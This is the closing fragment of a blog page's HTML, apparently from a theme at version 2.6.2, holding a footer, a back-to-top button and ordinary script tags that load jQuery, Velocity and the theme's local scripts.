v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>